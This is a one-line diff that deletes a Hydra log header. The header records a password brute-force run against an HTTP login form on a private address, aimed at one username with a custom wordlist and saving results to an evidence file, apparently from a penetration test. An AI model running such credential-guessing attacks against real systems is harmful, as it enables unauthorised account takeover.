@@ -1,1 +1,0 @@
-# Hydra v9.5 run at 2025-09-12 14:03:52 on 192.168.100.101 http-post-form (hydra -l wangxx -P wordlists/biographical_ultra_8char.txt -t 2 -W 3 -f -V -o evidence/html_biographical_ultra.txt 192.168.100.101 http-post-form /dologin.html:httpd_username=^USER^&httpd_password=^PASS^:login.html)
